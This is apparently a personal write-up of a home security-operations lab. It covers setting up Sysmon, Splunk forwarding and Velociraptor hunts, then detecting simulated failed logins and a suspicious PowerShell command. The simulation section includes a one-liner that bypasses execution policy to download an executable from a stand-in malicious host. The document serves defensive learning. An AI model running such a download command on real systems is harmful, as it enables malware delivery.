# SOC Lab

### Overview
---

The goal for this project is to get a better understanding of how Security Operations work and what tools blue teams have at their disposal to defend against emerging security threats. This lab is aimed to build a basic SIEM and experiment with tools like Sysmon for advanced logging, Splunk for real-time monitoring, and Velociraptor for endpoint forensics.
### Lab Setup
---

The lab setup here is going to be pretty basic. I will be running 3 VMs including:

* Windows 11 Host
* Ubuntu Server (Splunk)
* Ubuntu Server (Velociraptor) 

### Virtualization
---

To get the lab setup I am going to be using virt-manager with libvirtd. If you wish to follow along on Windows, VMware workstation, Virtualbox and Hyper-V are a few options you can use.

### Networking
---

As far as networking goes, I am going to create a new virtual network and put all of the VMs on it. If you want your SOC server to have internet access, you'll want to assign a NIC on a virtual network with NAT, and a second NIC for internal SOC traffic. Do not use a bridged network as we want all of our VMs to be isolated from our home network. 

### Software
---

The software stack we are going to be running in our SOC lab is pretty short: Sysmon, Splunk, and Velociraptor. 

* Sysmon will be put on the Windows 11 Host to achieve more advanced and granular logging, providing us with more data than what default Windows logging behavior would provide. 

* Splunk is our SIEM (Security Information and Event Management) solution. SIEMs are a vital step in monitoring and responding to incidents that may occur on our hosts and networks. They allow us to aggregate our logs across multiple hosts and run queries against them to analyze for suspicious behavior. We will be using the free version of Splunk Enterprise which allows us up to 500MB of indexing a day. 

* Lastly, Velociraptor is an open-source endpoint monitoring, digital forensic, and response platform. It's useful for using digital forensic artifacts to reveal clues as to how an attacker may have breached a host. It also works in real-time to triage these artifacts and attempt to identify anomalies.

Tools that gather data from many hosts give blue teams a larger, more detailed overview of what is happening in their infrastructure.

### Connecting it all
---

Once you have got Splunk and Velociraptor installed on your server VMs, lets get the host(s) connected to them. Firstly, lets get the Splunk Universal Forwarder installed on Windows. Make sure to point the forwarder to your Splunk server IP on port 9997. In our Splunk server VM I am going to enable receiving using this command: `splunk enable listen 9997 -auth admin:changeme`. Lastly, create an inputs.conf file in `C:\Program FIles\SplunkUniversalForwarder\etc\system\local\inputs.conf`. The Splunk Universal Forwarder uses this file to know what to watch and send to the indexer. Here is what I use to get Windows Logs and Sysmon logs forwarded:

```# Collect standard Windows event logs
[WinEventLog]
index = wineventlog

[WinEventLog://Application]
disabled=0
[WinEventLog://Security]
disabled=0
[WinEventLog://System]
disabled=0
```

Then in the Splunk Microsoft Sysmon Add-on inputs.conf:

```
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
index = sysmon
renderXml = 1
source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
```

Now if we do a search in Splunk we get:

<img src ="https://i.imgur.com/oslTpky.png">

Next up lets get our Windows host talking to Velociraptor. The setup process requires creating a server config, creating a server installation executable from that config, installing Velociraptor on your server, generating a host executable and finally installing the client agent on your host. I won't go through all of the steps here but here is the quick start guide from Velociraptor's documentation: https://docs.velociraptor.app/docs/deployment/quickstart/. In the end you should be able to see your endpoint listed in the search clients list.

<img src="https://i.imgur.com/ZdAASzp.png">

### Simulated Attacks
---

Lets first do a pretty simple attack: brute force login. On the Windows 11 Host I tried logging into my 'lab' account multiple times with the wrong password. 

<img src ="https://i.imgur.com/hfJbbpf.png">

Next let's run a suspicious PowerShell command: `powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest http://malicious.test/file.exe -OutFile C:\Users\Public\file.exe"

This command will attempt to download a file and write it to the disk (We're isolated from the internet so it fails).

<img src="https://i.imgur.com/8nvDn42.png">
### Splunk Detection
---

Let’s take a look at Splunk. Splunk uses SPL (Splunk Processing Language) to search, filter, and analyze the many events it ingests. Data in Splunk is stored in indexes, which you can think of like databases. Different types of data may be stored in different indexes—for example, event indexes store log-style data, while metric indexes are optimized for numeric performance metrics. Indexes allow you to efficiently select the data you want without searching the entire dataset.

Splunk ingests data from logs, APIs, or streaming sources, organizes it in indexes, and then allows you to query it with SPL. For example, a simple SPL query to find failed login events in an index called `wineventlog` might look like: `index=wineventlog EventCode=4625`

<img src = "https://i.imgur.com/hsIjawQ.png">

If we open the Event it gives us more detailed information like what account was used to try and log in, what the hostname is, and what the failure reason is.

<img src="https://i.imgur.com/U747LYD.png">
<img src="https://i.imgur.com/SeohptC.png">

Let's make our query more usable by creating a table with time, account, hostname, and ip: `index=main sourcetype=WinEventLog:Security EventCode=4625 | table _time Account_Name Workstation_Name IpAddress`

<img src="https://i.imgur.com/BIQR10j.png">

Now suddenly our logs become a lot more useful since we have a larger overview of what account is trying to be logged into, on what machine its happening, and at what time its happening. But we can get even more specific. We can see which account had the most attempts at logging in unsuccessfully: 
`index=main EventCode=4625 `
`| stats count by Account_Name, Workstation_Name`
`| sort -count`

<img src="https://i.imgur.com/Ky1Hf0i.png">

Now let's look for our suspicious PowerShell command:

`index=sysmon EventCode=1 Image="*powershell.exe"
`| stats count by CommandLine, ParentImage, Computer`
`
<img src="https://i.imgur.com/PgTLcil.png">
But how does this query work?

1. We first specify the events in the sysmon index with `index sysmon`, 
2. Then sort by `EventCode1`. Windows event codes are numerical identifiers for specific things that the operating system records. Event code 1 in this case represents a new process being created; in our instance this is cmd.exe. 
3. After getting all events with event code 1, we filter further by Image which is a field pulled from the sysmon event seen here:

<img src ="https://i.imgur.com/pGrwMXB.png">
### Velociraptor Investigation
---

Now that we've got a little more familiar with Splunk let's move into Velociraptor. In Velociraptor we search for specific things using VQL (Velociraptor query language) which is similar to SPL & SQL. To do this we create what is known as a hunt. Hunts run artifacts (VQL queries) across selected clients to collect data. Velociraptor will track the results per client and we can export this data as JSON or CSV to analyze further. Let's create our first hunt:

<img src="https://i.imgur.com/1UzE3cu.png">

Now we can select which artifacts we want, here is what I am going to run:

**Windows.EventLogs.Evtx** - Collect Windows EVTX logs (Security, System, Sysmon)
**Windows.EventLogs.LogonSessions** (ExplicitLogon) - parses logon/logoff events
**Process listings / Processinfo artifacts** - list running processes and command lines
**Network Connections** - enumerates TCP/UDP connections to link processes to external IPs
**File collection / file metadata** - collect files (or metadata) in directories you want to check for exfiltration
**Autoruns / Registry Artifacts** - Check for persistence

If I select Windows.EventLogs.Evtx, we can see the VQL that is being run:

<img src="https://i.imgur.com/KHKm0wT.png">

After selecting the artifacts you want to run, configure them to your liking and then we can launch them. Once the hunt is finished we can now go investigate. Click on the hunt you just ran, and open up a client it ran on. From the left hand menu we can select `Collected Artifacts`. Select the Artifacts that you chose to collect, and then head over to the results tab.

<img src ="https://i.imgur.com/MTGOQ7K.png">

Here we can see some of the different files that were downloaded on this host:

<img src="https://i.imgur.com/uiiYsh2.png">

Here we can see what ports are listening on our Windows host:

<img src ="https://i.imgur.com/ZMzsQ92.png">


### What's next?
---

Up to this point, I've put together a functional detection lab where Sysmon telemetry is able to be utilized, feeding into Splunk and Velociraptor. These tools show how they compliment one another in the detection pipeline. To expand this lab further I'd like to:

* Refine Sysmon and hunt configurations so the detections are more production-ready
* Set up scheduled hunts in Velociraptor and scheduled searches/alerts in Splunk to move closer to a more automated detection workflow
* Simulate broader attack behaviors
* Create small playbooks for what to do when each detection fires
